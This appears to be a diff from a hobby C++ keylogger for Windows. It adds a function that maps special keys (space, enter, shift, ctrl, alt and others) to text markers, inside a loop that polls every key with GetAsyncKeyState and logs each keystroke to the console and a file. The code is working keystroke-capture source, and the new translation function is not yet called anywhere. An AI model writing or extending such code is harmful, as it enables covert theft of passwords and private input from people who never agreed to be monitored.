@@ -15,18 +15,39 @@ void fileData(std::string data) {
 }
 
 std::string specialKey(int keyPressed) {
+    std::string translatedKey;
     //Space
+    if(keyPressed == VK_SPACE) {
+        translatedKey = " ";
     //Enter
+    } else if(keyPressed == VK_RETURN){
+        translatedKey = "\n";
     //Tab
+    } else if(keyPressed == VK_TAB) {
+        translatedKey = "   ";
     //Caps Lock
+    } else if(keyPressed == VK_CAPITAL) {
+        translatedKey = "[CAPS]";
     //Back Space
+    } else if(keyPressed == VK_BACK) {
+        translatedKey = "\b";
     //Shift
+    } else if(keyPressed == VK_SHIFT) {
+        translatedKey = "[SHIFT]";
     //Control
+    } else if(keyPressed == VK_CONTROL) {
+        translatedKey = "[CTRL]";
     //Alt
-    return "ah";
+    } else if(keyPressed == VK_MENU) {
+        translatedKey = "[ALT]";
+    };
+
+    return translatedKey;
 }
 
+
 int main() {
+    bool isSpecial;
     //loop forever
     while(true){
         //Loop through each key using Virtual-Key Codes.
@@ -35,11 +56,12 @@ int main() {
             //Check if the key is pressed
             //-32767 specifically so it checks if the least significant bit is set, indicating key was pressed after the call.
             if(GetAsyncKeyState(keyCode) == -32767) {
+                //If its a special key, translate it
                 std::cout << char(keyCode) << std::endl;
                 //Fills the string with 1 of the character array.
                 fileData(std::string(1, char(keyCode)));
             }
-            //If its a special key, translate it
+            
         }
     }
     
